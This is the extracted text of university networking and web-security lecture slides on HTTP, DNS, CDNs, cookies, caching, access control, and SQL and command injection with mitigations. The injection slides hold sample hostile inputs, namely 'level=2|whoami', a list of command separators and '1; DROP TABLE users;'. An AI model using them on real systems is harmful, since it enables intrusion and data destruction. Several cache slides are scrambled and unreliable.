`

# Web and HTTP



## Introduction

- Web Overview
- HTTP Overview
- HTTP Connections
- HTTP request message
- HTTP response status
    code
- Web caches



## Web Overview

- Web page consists of objects, each of which can be stored on
    different Web servers.
- Object can be HTML file, JPEG image, Java applet, audio file.
- Web page consists of base HTML-file which includes several
    referenced objects, each addressable by a URL.

```
http://www.someschool.edu/someDept/pic.gif
```
```
host name path name
```

## HTTP Overview

- HTTP: hypertext transfer protocol
- Web’s application-layer protocol
- Client/server model:
    - Client: browser that requests, receives,
       (using HTTP protocol) and “displays”
       Web objects
    - Server: Web server sends (using HTTP
       protocol) objects in response to
       requests


## HTTP Connections

**Non-persistent HTTP**

- TCP connection opened
- At most one object sent over
    TCP connection
- TCP connection closed
- Downloading multiple
    objects required multiple
    connections

```
Persistent HTTP
```
- TCP connection opened to a
    server
- Multiple objects can be sent
    over single TCP connection
    between client, and that
    server
- TCP connection closed


## HTTP request message


## HTTP response status code

- Status code appears in 1st line in server-to-client response
    message.
- Some sample codes:
    - 200 OK
    - 301 Moved Permanently
    - 400 Bad Request
    - 404 Not Found
    - 505 HTTP Version Not Supported


## Web caches

- Satisfy client requests without
    involving origin server.
- User configures browser to point to
    a (local) Web cache.
- Browser sends all HTTP requests to
    cache
       - if object in cache: cache returns object
          to client
       - else cache requests object from origin
          server, caches received object, then
          returns object to client


## Conclusion

- Web Overview
- HTTP Overview
- HTTP Connections
- HTTP request message
- HTTP response status
    code
- Web caches



`

# Domain Name System



## Introduction

- What is DNS?
- Services Provided
- How DNS works?
- Method of Query



## What is DNS?

- Domain Name System
- It is a hierarchical system of distributed name server databases
    that contain information on domains and hosts within those
    domains.


## DNS Services

- Host aliasing
- Mail server aliasing
- Load distribution.
- Translates host name to IP address (Main Task of DNS)


## DNS Working

- User machine runs the client side of the DNS application
- The browser extracts the hostname, [http://www.amrita.edu,](http://www.amrita.edu,) from the URL
    and passes the hostname to the client side of the DNS application
- The DNS client sends a query containing the hostname to a DNS
    server
- The DNS client eventually receives a reply, which includes the IP
    address for the hostname
- Once the browser receives the IP address from DNS, it can initiate a
    TCP connection to the HTTP server process located at port 80 at
    that IP address


## Iterative DNS Query

- Root DNS Server
- Top – Level Domain Server
- Authoritative DNS Server
- DNS Caching

Image Reference:Kurose, James F.Computer networking: A top-down approach
featuring the internet, 3/E. Pearson Education India.


## Recursive DNS Query

- Root DNS Server
- Top – Level Domain Server
- Authoritative DNS Server
- DNS Caching

Image Reference:Kurose, James F.Computer networking: A top-down approach
featuring the internet, 3/E. Pearson Education India.


## Conclusion

- What is DNS?
- Services Provided
- How DNS works?
- Method of Query



`

# Peer-to-Peer Model



## Introduction

- Overview of P2P
    Model
- Client-Server Vs P2P
- Merits and Demerits



## Overview of P2P Model

- Self-organizing, no central management
- Resource sharing, e.g., files
- Based on voluntary collaboration
- Peers in P2P are all equal
- Large number of peers in the network
- Content distribution, communication, distributed
    computation, and collaboration


## Client-Server Vs P2P

```
Reference: Computer Networking: A TopTextbook by Jim Kurose and Keith W. Ross -Down Approach, 7th Edition
```

## Advantages of P2P Model

- Efficient use of resources - Unused bandwidth, storage, and
    processing power at the edge of the network
- Improved scalability - Consumers of resources also donate
    resources, Aggregate resources grow naturally with utilization.
- Reliability –Replicas, Geographic distribution, No single point
    of failure
- Ease of administration -Nodes self-organize, No need to
    deploy servers to satisfy demand (c.f. scalability), Built-in fault
    tolerance, replication, and load balancing.


## Disadvantages of P2P Model

- Weak security
- Lack of centralized control. Computers with shared

```
resources may suffer from lazy performance.
```

## Conclusion

- Overview of P2P
    Model
- Client-Server Vs P2P
- Merits and Demerits



`

# Client – Server

# Architecture



## Introduction

- What is the client-
    server Model?
- Functions of Client-
    Server model
- Classification of Client-
    Server model
- Client-Server Web
    Services



## What is the client-server model?

- A Client is any process that requests specific services from the
    server process.
- A Server is a process that provides requested services for the
    Client.
- Client and Server processes can reside in the same computer
    or on different computers linked by a network.
- Web Server.

```
Reference: http://aagasc.edu.in/cs/books/client-server-computing.pdf
```

## Functions of the Client-Server model

- The main operations of the
    **Client** are listed below:
       - Managing the user interface.
       - Accepts and checks the syntax of
          user inputs.
       - Processes application logic.
       - Generates database requests and
          transmits them to server.
       - Passes response back to the
          server.
             - The main operations of the
                **server** are listed below:
                   - Accepts and processes database
                      requests from client.
                   - Checks authorization.
                   - Ensures that integrity constraints
                      are not violated.
                   - Performs query/update
                      processing and transmits
                      responses to client.
                   - Maintains system catalogue.
                   - Provide concurrent database
                      access.
                   - Provides recovery control.


## Classification of Client-Server model

- Two-tier Client/Server Model
- Three-tier Client/Server Model


## Two-tier Client/Server Model

- The application processing is done separately for database

```
queries and updates and for business logic processing and
user interface presentation. Usually, the network binds the
back-end of an application to the front-end, although both
tiers can be present on the same hardware.
```

## Three-tier Client/Server Model

- In three-tier architecture application responsibilities are
    divided into three logical categories.
       - Presentation (GUI) or user services
       - Application services or business rules
       - Database services or data server


## Client-Server Web Services

```
Reference: http://aagasc.edu.in/cs/books/client-server-computing.pdf
```

## Conclusion

- What is the client-
    server model?
- Classification of Client-
    Server model
- Architecture of Client-
    Server Model
- Client-Server Web
    Services



`

# Content Distribution

# Network



## Introduction

- Content Distribution
    Network
- Why CDN?
- CDN Operations
- Real time case study about
    Netflix adaptation with
    CDN.


## Content Distribution Network

- Also known as Content Delivery Network, is a large
    geographically distributed network of specialized servers that
    accelerate the delivery of web content and rich media to
    internet connected devices [Akamai].
- Faster delivery of services.
- It lowers redundant data rates.
- Helps in mitigating Denial-of-Service attack.


## Why CDN?

- Overcomes the need of implementing single massive data
    center.
       - It will be far away from the users and likely to pass through many links
          to reach end devices, which may lead to buffer and delay in content.
       - Same video will be sent many time over the ISP which will cost even
          the providers.
       - Possibilities for Single point of failure.
- To overcome these issues, providers adapted CDN which
    provides better delivery.


## CDN Operations

```
The user visits the web page at
http://www.livematch.com
```
```
Step 1
```
```
When the user clicks on the link, the user’s
host send the DNS query for the
corresponding Domain.
```
```
Step 2
```
```
Here, authoritative server redirects the
traffic to CDN’s DNS server rather than
providing IP address.
```
```
Step 3
```
```
Here DNS query enters the private CDN’s
DNS infrastructure.
```
```
Step 4
```
```
The LDNS forwards the IP address of the
content serving DNS node.
```
```
Step 5
```
Then it establishes a direct connection with
that server.
Image Reference:Kurose, James F.Computer networking: A top- Step 6
down approach featuring the internet, 3/E. Pearson Education India.


## Cluster selection strategies

- After getting the IP address, the CDN has to choose the

```
appropriate cluster. Let’s look into few approaches:
```
```
Geographically
closest
```
- Chooses geographically closest cluster
- Not effective when LDNS is at remote location.

```
Real-Time
measurements
```
- Measurements of delay and loss performance.
- But few LDNS are not configured to accept these
    features.


## Netflix video Streaming Platform

- Main Functions:
    - Content ingestion
    - Content Processing
    - Uploading versions to its
       CDN.

Image Reference:Kurose, James F.Computer networking: A top-down
approach featuring the internet, 3/E. Pearson Education India.


## Conclusion

- What is Content
    Distribution Network.
- Why CDN is needed?
- How it is working?
- Studied CDN with case
    study.



`

# Wireshark Overview



## Introduction

- Wireshark Usage
- Layered Approach




## Conclusion

- Wireshark Usage
- Layered Approach



`

# Traffic Analysis Using

# Wireshark



## Introduction

- Traffic Analysis
- Sensitive Information
    Capturing




## Conclusion

- Traffic Analysis
- Sensitive Information
    Capturing



`

## Web Application Security

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Same Origin Policy: How a Web

### Page works

- A web page typically has a domain name (for example [http://www.amrita.edu)](http://www.amrita.edu))
- The browser then sends a request to that server for the page you want, using a standard
    called Hypertext Transfer Protocol or HTTP or HTTPs
- HTTP communicates through TCP ports and the default port used by HTTP is 80 and by
    HTTPs is 443.


### Same Origin Policy

- Same Origin Policy is a critical web application security mechanism
- The same-origin policy states that when a user is viewing a web page in his
    browser, script running on that web page should only be able to read from or
    write to the content of another web page if both pages have the same origin.


### Same Origin Policy

- The origin consists of combination of :
    - page’s application layer protocol (HTTP or HTTPS),
    - its TCP port (usually 80 for HTTP or 443 for HTTPS),
    - its domain name


### Same Origin Policy

**Source URL https://www.amrita.edu/photos**

**URL Scripting Requests Allowed?**

[http://www.amrita.edu/photos](http://www.amrita.edu/photos) Will not work; protocol is different

https://amritaedu/photos Will not work; domain name is different

https://www.amrita.edu:8080/photos Will not work; port number is different

https://www.amrita.edu/gallery Will work


### Same Origin Policy

- It limits functionality of scripting code running in users’ web browser
    or at the client side
- It applies to browsers running client side scripting code and has no
    effect on what server side code can access


### Need for SOP

- Without the same-origin policy, if you visit a malicious website the script in
    that website would be able to read confidential information from other
    websites where you have already logged in.
    - For example: abc.com would be able to read information from gmail.com if there was no
       SOP.
- When a browser sends an HTTP request from one origin to another, any
    cookies, including authentication session cookies, relevant to the other
    domain are also sent as part of the request.
- Esssentially SOP is required for privacy and security


`

## Web Application Security

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### HTTP: A stateless protocol

- A stateless protocol is a communication protocol in which the receiver must
    not retain session state from previous requests.
- HTTP is a "stateless" protocol means that each time a client retrieves a
    Webpage, the client or the web browser opens a separate connection to the
    Web server
- The server automatically does not keep any record of previous client request if
    it is using HTTP


### Cookies

- An Http cookie, also known as a web cookie, is a small piece of
    data that the server sends to the web browser.
- The typical use of the cookies is session management,
    personalization and tracking.
- In all these cases it is used to identify multiple requests from the
    same resource (browser).
- It helps the user to keep logged in and trace his data, such as user
    name and session.


### How Cookies Work

#### 1. When a user visits a website, the web server —which stores the website’s data —sends a short

```
stream of identifying info which is the cookie-to the visiting user’s web browser.
```
#### 2. Cookies are stored locally in the web browser to remember the “name-value pair” that

```
identifies the user. The server sends the cookie when it wants the web browser to save it.
```
#### 3. If a user returns to that site in the future, the web browser returns that data to the web server

```
in the form of a cookie to recall the data from previous sessions and to identify the user
```


### Cookie Attributes

**Secure Attribute:** The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure
channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests.

**HttpOnlyAttribute:** The HttpOnlyattribute is used to help prevent attacks such as session leakage, since it does not allow
the cookie to be accessed via a client-side script such as JavaScript.

**Domain Attribute:** The Domain attribute is used to compare the cookie’s domain against the domain of the server for
which the HTTP request is being made. If the domain matches or if it is a subdomain, then the path attribute will be
checked next.

**Path Attribute:** In addition to the domain, the URL path that the cookie is valid for can be specified using path attribute
and if the domain and path match, then the cookie will be sent in the request.

**Expires Attribute:** The Expires attribute is used to set persistent cookies and limit lifespan if a session lives for too long

**SameSiteAttribute:** This attribute is used to assert that a cookie should not to be sent along with cross-site requests and
helps mitigate the risk of cross-origin information leakage and also to prevent cross-site request forgery attacks. This
attribute can be configured in three different modes: Strict, Lax and None


### Cookie Prefixes

In order to give cookie the capabilities to guarantee the integrity and confidentiality of the information stored in them
concept of Cookie Name Prefixes was introduced.

**Host Prefix:** The __Host-prefix expects cookies to fulfill the following conditions:

- The cookie must be set with the Secure attribute.
- The cookie must be set from a URI considered secure by the user agent.
- Sent only to the host who set the cookie and MUST NOT include any Domain attribute.
- The cookie must be set with the Path attribute with a value of / so it would be sent with every request to the host.

**Secure Prefix:** The __Secure-prefix is less restrictive. Any cookie that matches the prefix __Secure-would be expected to
fulfill the following conditions:

- The cookie must be set with the Secure attribute.
- The cookie must be set from a URI considered secure by the user agent.


### Examples

An example Cookie Attribute Configuration can be:

Set-Cookie: __Host-SID=<session token>; path=/; Secure; HttpOnly; SameSite=Strict.

Set-Cookie: __Host-SID=12345; Secure; Path=/

Invalid Settings for Cookies would include:

Set-Cookie: __Host-SID=12345
Set-Cookie: __Host-SID=12345;Secure
Set-Cookie: __Host-SID=12345; Domain=site.example
Set-Cookie: __Host-SID=12345; Domain=site.example; Path=/
Set-Cookie: __Host-SID=12345; Secure; Domain=site.example; Path=/


### Cookies

**Session Cookies**
These cookies are temporary and will only be stored in the memory of user’s browser while it’s open. When it’s closed, the cookie will be
removed from browser’s history, and, because of this, they are a lower security risk.
These cookies are often used for personalization when working within e-commerce shopping carts, controlling what a user sees ona page
when they’re conducting a one-off, multi-page site visit, or for other storage means that are short-term.
**Persistent Cookies**
These cookies are used over a much longer period of time, as an expiration date is tagged to them by the issuer using the expires attribute.
Each time user return to the website that created this cookie, or go to a website that has a resource produced by the cookie’s issuer (eg, an ad),
this data is returned to the user.
Thus, these cookies can track user’s browsing activity not just on the original site where the cookie was created but on other sites that have a
resource which has been produced by the original site. For example, Facebook and Google use these kinds of mechanisms to create a user
activity log across a range of different websites. So, when the user click “Remember Me” (or something similar) after they have logged into
online account somewhere, they will be creating a persistent cookie, which will store the login details on the browser.
As these persistent cookies are present for a longer period than session cookies, and can essentially track what the user is doing over more
than one site, a greater security risk is posed by them.


`

## Web Application Security

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Cache

- A Web cache sits between web server/s and client/s and watches requests come by, saving
    copies of the responses for itself. When another request for the same URL comes, it uses the
    response that it has stored, instead of asking the origin server for it again.
- Browsers typically cache static assets like image, logos, backgrounds etc. that do not change
    from visit to visit
- Caching improves and speeds up browsing. Once an asset is cached, it lives (for a time) on the
    machine. Retrieving files from cache will always be faster than retrieving them from a remote
    server, no matter how fast the Internet connection is.
- It is a resourceful technique that is used by developers to improve web browsing experience.


### Types of Cache

- Therearetwomaintypesofcaches: **privatecachesandsharedcaches**.
- **Private cache** : isa cache tiedto aspecific client —typically abrowser cache.Since the storedresponse is
    notsharedwithotherclients,aprivatecachecanstoreapersonalizedresponseforthatuser.
- **Shared cache** : is located between the client and the server and can store responses that can be shared
    amongusers.Sharedcachescanbefurthersub-classifiedintoproxycachesandmanagedcaches.
       - **Proxycaches** areatypeofsharedcacheandhavealargenumberofusers.Proxycachesarenotpartoftheclientor
          the origin server and requests to them are either routed through browser’s proxy setting manually or through
          interception where Web requests are redirected to them by the underlyingnetwork itself. They are very good at
          reducing latency and network traffic and are used by large corporations and on their firewalls, or as standalone
          devicesknownasintermediaries.
       - **Managed Cache** :are explicitlydeployed byservice developersto offload the originserverand todelivercontent
          efficiently. Gateway Caches which are examples of managed cache are also known as **reverse proxy caches or**
          **surrogate caches.** They are alsointermediaries, but instead of beingdeployed bynetwork administrators tosave
          bandwidth, they’re typically deployed by Webmasters themselves,to make their sites more scalable, reliableand
          better performing.Requestscanberoutedtogatewaycachesbyanumberofmethods,buttypicallysomeformof
          loadbalancerisusedtomakeoneormoreofthemlookliketheoriginservertoclients.


### Types of Cache


### Validators and Validation

- Validationavoidhavingisusedtodownloadby serverstheandentirecachesrepresentationtocommunicatewhentheywhenalreadya representationhaveacopyhaslocally,changedbutthey’re.By usingnotit,surecachesifit’s
    stillfresh.
- TheWhenmostacachecommonhas validatorarepresentationisthetimestoredthatthatthedocumentincludesalastLastchanged,-Modifiedasheader,communicateditcanuseinit **Last** toask **- Modified** theserver **header** ifthe.
    representationrespondwith 304 hasnotchangedmodifiedsinceifthethecontentlast timehasnotit waschangedseen,sincewiththean specified **If-Modified** time **- Since**. **request**. The server will
       GET/index.htmlHTTP/ 1. 1
       Host:example.com
       Accept:text/html
       If-Modified-Since:Tue, 22 Feb 202222 : 00 : 00 GMT
- **ETags** changedareeveryvalidatorstimethein therepresentationformofuniquedoesidentifiers.Becauseintroducedtheservercontrolsin HTTPhow 1. 1 thattheETagaregeneratedisgenerated,bythecachesservercanandbe
    sureserverthatwillifreturntheETag 304 matchesNotModifiedwhentheyif themakevalueaof **If-** the **None** ETag **- Match** header **request** itdetermines,therepresentationfortherequestedreallyisresourcethesameis.Thethe

sameEtagheaderastheheaderIf-Noneit-Matchdeterminesvalueforin thetherequestrequested.Theresourceserver willistherespondsameaswiththe (^304) If-Nonenot-Matchmodifiedvalueif theinthevaluerequestof the.
GET/index.htmlHTTP/ 1. 1
Host:example.com
Accept:text/html
If-None-Match:" 33 a 64 df 5 "


### HTTP Headers

- All cacheshaveasetof rules thattheyuse todeterminewhentoservearepresentation
    fromthecachewhicharesetinHTTPprotocolsandisspecifiedusingHTTPheaders.
- **Expires HTTP header:** is a basic means of controlling freshness in caches. It tells
    caches how long the associated representation is fresh for. After that time, caches will
    alwayscheckbackwiththeoriginservertoseeifadocumentischanged.
       - Forexample:Expires:Fri, 30 Oct 199814 : 19 : 41 GMT
- **Cache-ControlHTTPHeaders** :
    - **max** considered **- age** (infreshseconds). Max—-agespecifiesis thethenumbermaximumof secondsamount offromtimethethattimea representationof the requestwillthebe
       representationwillbefresh
    - **no** responses **- cache** directivewithoutrevalidationdoes notprevent. the storing of responses but instead prevents the reuse of
    - **no-store** —instructscachesnottokeepacopyoftherepresentationunderno-store
    - **private** andnotbedirectiveleakedwilltoanycauseothertheuserpersonalizedofthecacheresponse. to only be stored with the specific client
    - **must-revalidate:** tellscaches thatthey mustobeyanyfreshnessinformationthatisgiventothem
       aboutarepresentation.


### Sample HTTP Header with Cache Control

##### HTTP/1.1 200 OK

Date: Fri, 30 Oct 2022 13:19:41 GMT

Server: Apache/1.3.3 (Unix)

Cache-Control: max-age=3600, must-revalidate

Expires: Fri, 30 Oct 2022 14:19:41 GMT

Last-Modified: Mon, 29 Jun 2022 02:28:12 GMT

ETag: "3e86- 410 - 3596fbbc"

Content-Length: 1040

Content-Type: text/html


`

## Web Application Security

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Access Control in Web Applications

- An access control system is a mechanism that regulates access
    to data or functionality by determining whether a subject is
    permitted to perform an operation on a target object.
- To make this determination, the access control mechanism
    relies on two related processes—authentication and
    authorization.


### Authentication

- Authentication is the process in which a subject proves that they are
    who they claim to be.
- This consists of two steps: identification and confirmation.
    - Identification is the claim to be a certain person
    - Confirmation allows a subject to prove that claim


### Authentication

- There are three classes into which we can group the different factors
    that can be used to prove identity:
       - Something you know : For example – passwords, pins, passphrase
       - Something you are : For example – biometric mechanisms
       - Something you have : For example –token ids, security tokens, digital
          certificate


### Types of Authentication

- **Two Factor Authentication** : It is the validation of someone’s identity
    using factors from two of the three categories, For example using
    ATM card and pin
- **Single Sign On Authentication** : It allows a user to enter their
    credentials once and access multiple web applications that may
    have been developed and secured independently but tie into or
    support the SSO system. For example : Google Accounts
- **Custom Authentication Systems** : is when the web application has
    created its application logic to process the credentials of the user.


### Web Application Authentication


### Authorization

- It is the process of determining whether a subject has sufficient
    permission to perform a given operation against a target resource.


### Authorization Goals

- We authorize for the following reasons:
    - To ensure that users can only perform actions within their
       privilege level.
    - To control access to protected resources using criteria based on a
       user’s role or privilege level.
    - To mitigate privilege escalation attacks


### Access Control Models

- **Discretionary Access Control (DAC) :** access control is left to the discretion of the owner of an object or other resource.
    System-wide or applicationwide access control rules can typically be overridden by the owners of objects and resources.
- **Mandatory Access Control (MAC)** In MAC, access control is determined by the system, or by system administrators,
    rather than object owners. Its advantages include stronger limits on what can potentially happen within the application,
    as well as the simplification of design and user interface.
- **Role-Based Access Control (RBAC)** RBAC implements access control by means of roles. Access determinations are still
    made by system administrators in the context of a more general framework. Administrators define new roles and assign
    uses to them, which is often not possible in strict MAC-oriented systems.
- **Hybrid systems:** are a mix and match of these three different access control models and is used by many web
    applications. The social media site Facebook, for example, mixes RBAC and DAC; roles such as user and administrator
    codify broad permission policies, but the application also incorporates elements of discretionary access by allowing
    users to control who can see what information on their “wall.”


### Authorization Layers

Web Browser Web Server Application Server Database Server

Operating System Operating System Middleware Middleware

Hardware Hardware Operating System Operating System

```
Hardware Hardware
```

## ` Introduction to web

## development

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Reference

- Stuttard, D., & Pinto, M. (n.d.). The Web Application Hacker’s Handbook Discovering and
    Exploiting Security Flaws.
- Sullivan, B., Liu, Vincent., & Howard, Michael. (2012). W eb application security: a beginner’s
    guide. McGraw-Hill.
- https://www.javatpoint.com/
- https://www.w3schools.com/php/


### Web Application Development

### Architecture

- A web application is a software application that runs on a web
    server. It is stored on a remote server and delivered over the
    Internet through a browser interface.
- There are both client-side and server-side scripts in a web
    application. The server-side scripts deal with storing the data and
    the client-scripts present this data to the customer.



### Client Side Scripting

- Client-side scripting generates code that may be executed on the
    client end without needing server-side processing. These scripts
    are typically embedded into HTML text.
- It is also used for validations and functionality for user events.
- The client-side scripting may significantly reduce server demand.
- The client-side script responds faster than the server-side script.
- It is less secure than server-side scripting due to the code
    accessibility offered to the client.
- The client-side programming languages are HTML, CSS, and
    JavaScript.


### Hyper Text Markup Language

- It is the standard markup language for creating Web
    pages
- It describes the structure of a Web page
- HTML consists of a series of elements which tell the
    browser how to display the content


### Elements in HTML

- All HTML documents start with a <!DOCTYPE> declaration. It tells
    the browser about what document type to expect.
       - <!DOCTYPE html>
- The <html> element is the root element and it defines the whole
    HTML document. It has a start tag <html> and an end tag </html>.
- The <body> element defines the document's body.It has a start tag
    <body> and an end tag </body>.
- The general syntax of a HTML element is <tagname>Content
    </tagname>
       - <p>This is a para</p>
- Some of the HTML tags are <h1>,<br>, <div>, <section>, <img>




### HTML Form

- The HTML <form> element can contain one or more form
    elements. Some of which are:
       - <input>: different input types you can use in HTML
          - Input type can be text, button, radio, password, email etc
       - <label>: it defines a label the form elements. for attribute of the
          <label> tag should be equal to the id attribute of the <input>
          element to bind them together.
       - <select> : it defines a drop-down list
       - <textarea>: defines a multi-line input field
       - <button>: defines a clickable button



### Cascading Style sheets - CSS

- CSS describes how HTML elements are to be displayed on screen
- It can control the layout of multiple web pages all at once
- There are three ways of inserting a style sheet:
    - External CSS :The style definitions are saved in external .cssfiles so that it can be
       used in multiple html files
          - <link rel="stylesheet" href=“style1.css">
    - Internal CSS: is defined inside the <style> element, inside the head section.
       - <head>
          <style>
          bodybackground{ -color: linen;
          }
             </style>
    - Inline CSS : is used by adding style attribute to the relevant element.
       - <h1 style="color:blue;text-align:center;">This is a heading</h1>



### JavaScript

- JavaScript is the dominant client-side scripting language of
    the Web and forms the core technology alongside HTML and
    CSS.
- Scripts are embedded in or included from HTML documents
- All major web browsers have a built-in JavaScript engine that
    executes the code on the user's device.
- Examples of Javascript includes:
    - Loading new web page content without reloading the page
    - Web page animations
    - Playing browser games
    - Validating input values of a web form



### Backend or Server Side

- The server side is concerned with data access, error handling, and
    data processing speed. It consists of database, the server, the APIs,
    and the backend web software written in the server-side scripting
    language.
- Server-side scripting is a programming technique for creating code
    that may run software on the server side. It provides an interface to
    the user
- It also limit access to proprietary data and help keep control of the
    script source code. The web server hides the scripts from the end
    user until the content is delivered, making the data and source
    code safer.
- Some of the server-side scripting programming languages are PHP,
    ColdFusion, Python, ASP.net, Java, C++, Ruby, C#, etc.


### PHP

- PHP is a recursive acronym for "PHP: Hypertext Preprocessor".
- PHP is a server side scripting language that is embedded in
    HTML. It is used to manage dynamic content, databases,
    session tracking etc.
- PHP scripts are executed on the server


### Why PHP

- PHP can handle forms, i.e. gather data and save data to a file,
    and return data to the user
- PHP enables to add, delete, modify elements within the
    database
- PHP enables accessing of cookies variables and setting
    cookies


### Using PHP in HTML

- PHP can used in three ways:
    - <?php PHP code?>
    - <? PHP code?>
    - <script language="php"> PHP code goes here </script>
    <head>
    <title>Using PHP</title>
    <body>
       <?php echo "Hello, World!";?>
    </body>
    </html>


### Database Concepts

- Data is a collection of objects ranging from plain simple facts to complex
    images which provide us with necessary information about a particular entity. A
    database is an organized and structured collection of this data and a database
    management system (DBMS) is a tool which manages, organises and interacts
    with the databases. A database server or DBMS searches and manages data
    that’s stored in databases.
- The database tier stores and retrieves data. It’s also responsible for managing
    updates, allowing simultaneous (concurrent) access from web servers,
    providing security through authentication and ensuring the integrity of data,
    and providing support services such as data backup.
- There are several different types of database management systems. SQL DBMS
    utilizes Structured Query Language (SQL) to perform operations like insert,
    search, update and delete. It helps in optimizing and maintaining the data
    within the database.


### SQL

- The database server applications interface is accessed using
    SQL. It’s a standard query language that’s used to define and
    manipulate databases and data, and it’s supported by all
    popular database servers.
- SQL also allows you to update and delete data and databases,
    and it includes many other features such as security and
    access management, multiuser transactions that allow many
    users to access the same database without corrupting the
    data, tools to import and export data, and powerful undo and
    redo features.


`

## SQL injection

```
Meena Lakshmi
Centre for Cyber Security
Amrita Vishwa Vidyapeetham
```

### Relational Database Management System

- RDBMS stands for Relational Database Management System.
- A Relational database management system (RDBMS) is a
    database management system (DBMS) that is based on the
    relational model as introduced by E. F. Codd.
- RDBMS is the basis for SQL, and for all modern database
    systems like MS SQL Server, IBM DB2, Oracle, MySQL, and
    Microsoft Access.


### Data in RDBMS

- The data in an RDBMS is stored in database objects which are
    called as tables. This table is basically a collection of related data
    entries and it consists of numerous columns and rows.
- Every table is broken up into smaller entities called fields.
- A record is also called as a row of data is each individual entry that
    exists in a table.
- A column is a vertical entity in a table that contains all information
    associated with a specific field in a table.
- A NULL value in a table is a value in a field that appears to be
    blank, which means a field with a NULL value is a field with no value


### Relational database


### SQL

- SQL is Structured Query Language, which is a computer
    language for storing, manipulating and retrieving data stored
    in a relational database.
- SQL is the standard language for Relational Database System.
    All the Relational Database Management Systems (RDMS) like
    MySQL, MS Access, Oracle, Sybase, Informix, Postgres and
    SQL Server use SQL as their standard database language.


### Basic Commands in RDBMS

```
CREATE TABLE CUSTOMERS (
ID INT NOT NULL,
NAME VARCHAR (20) NOT NULL,
AGE INT NOT NULL,
ADDRESS CHAR (25),
SALARY INT,
PRIMARY KEY (ID)
);
```

### Basic Commands in SQL

##### • SELECT * FROM

##### CUSTOMERS WHERE ID=5

##### • SELECT NAME, ADDRESS

##### FROM CUSTOMERS

##### WHERE SALARY >6000;


### Basic Commands in SQL

##### • INSERT INTO CUSTOMERS

##### (ID, NAME, AGE,

##### ADDRESS,SALARY)

##### VALUES(

##### 8, KAMAL,30, COCHIN, 7000

##### );


### Basic Commands in SQL

##### • UPDATE CUSTOMERS

##### SET SALARY = 9500

##### WHERE

##### ID =6;


### Basic Commands in SQL

##### • DELETE FROM CUSTOMERS

##### WHERE NAME=RAMESH;


### Basic Commands in SQL

##### CREATE DATABASE ORDERS;

##### DROP DATABASE ORDERS;


### SQL Commands: Union

- The UNION operator is used to combine the result-set of two or more SELECT
    statements.
- Every SELECT statement within UNION must have the same number of columns
- The columns must also have similar data types
- The columns in every SELECT statement must also be in the same order
- SELECT column_name(s) FROM table1
- UNION
- SELECT column_name(s) FROM table2;
- SELECT City FROM Customers
- UNION
- SELECT City FROM Suppliers
- ORDER BY City;


### SQL Injection

- A SQL injection attack consists of insertion or “injection” of a
    SQL query via the input data from the client to the application.
- A successful SQL injection exploit can read sensitive data from
    the database, modify database data (Insert/Update/Delete),
    execute administration operations on the database (such as
    shutdown the DBMS), recover the content of a given file
    present on the DBMS file system and in some cases issue
    commands to the operating system.
- SQL injection attacks are a type of injection attack, in which
    SQL commands are injected into data-plane input in order to
    affect the execution of predefined SQL commands.



### HTTP methods

- The browser or the client sends information to the web server
    using HTTP methods. The two most commonly used methods
    are:
       - The GET Method
       - The POST Method
- The browser encodes the information it sends to the server
    using a scheme called URL encoding. In this scheme,
    name/value pairs are joined with equal signs and different pairs
    are separated by the ampersand.
       - name 1 =value 1 &name 2 =value 2 &name 3 =value 3


### The GET Method

- GET is used to request data from a specified resource.
- The name/value pairs is sent in the URL of a GET request
    separated by ‘?’
- /test/form1.php **?name1=value1&name2=value2**
- To collect data in PHP we use PHP $_GET. It is a PHP super
    global variable which is used to collect form data after
    submitting an HTML form with method="get".
- It can also collect data sent in the URL.


```
The form page will be
<form action = “test.php" method = "GET">
Name: <inputtype = "text"name= "name" />
Age: <input type ="text"name = "age"/>
<input type ="submit" /> </form>
```
The test.php script will be

<?php
if($_GET["name"] || $_GET["age"] ){
echo "Welcome ".$_GET['name']. "<br/>";
echo "You are ". $_GET['age']. " years old.";
exit();
}?>


### The POST Method

- The POST method transfers information to the server.
- The data is stored in the request body of the HTTP request
    when the method is POST
- When the method is POST the requests are not cached and
    do not remain in the browser history
       POST /test/form1.php HTTP/1.1
       Host: amrita.edu

```
name1=value1&name2=value2
```

### Command Injection

- OS command injection (also known as shell injection) is a web
    security vulnerability that allows an attacker to execute
    arbitrary operating system (OS) commands on the server that
    is running the application
- The main loophole through which command injection can be
    executed is when user-supplied input is not validated in
    applications.


### Commands in Unix and Windows

**Command Linux Windows**
Name of User Whoami Whoami
Operating System Uname–a Ver
Network configuration Ifconfig Ipconfig
Network connection Netstat –an Netstat –an
To display arguments/text
string

```
Echo Echo
```
To check the network
connectivity between host and
server/host

```
Ping Ping
```

### Command Separators

- Command Separators for Linux and Windows
    - &,&&,|,||
- Command Separators for Linux
    - ;,\n
    - ‘injected command’, $(injected command)


- https://test1.com/status?empID=29&level=2
- Modified parameter
    - level=2|whoami


### Mitigating SQL Injection

- Prepared Statements (with Parameterized Queries)
- Stored Procedures
- Allow-list Input Validation
- Escaping All User-Supplied Input


### Mitigating SQL Injection: Prepared Statements

### with Parameterized queries

- A prepared statement is a feature used to execute the same (or
    similar) SQL statements repeatedly with high efficiency.
- A SQL statement template is created and sent to the database
    where some parameters are unspecified and are labeled as **"?"**.
    Example: select * from users where user=? And password =?.
- The database **parses, compiles, and performs query**
    **optimization** on the SQL statement template, and stores the result
    **without executing** it. The application binds the values to the
    parameters, and the database executes the statement later.
       - $inputdata = "1; DROP TABLE users;"
       - $query = "SELECT * FROM users where id=$inputdata";
       - select * from users where user=?


### Mitigating SQL Injection: Stored Procedure

### with Parametrized Queries

- A stored procedure is a prepared SQL code that you can save,
    so the code can be reused over and over again.
       CREATE PROCEDURE Customerlist @City nvarchar(10)
       AS
       SELECT * FROM Customers WHERE City = @City
       GO;
       EXEC Customerlist @City = ‘Cochin';


### Mitigating Injection Attacks: Input Validation

- Input validation is performed to ensure only properly formed data
    is entering the workflow in an information system, preventing
    malformed data from persisting in the database and triggering
    malfunction of various downstream components.
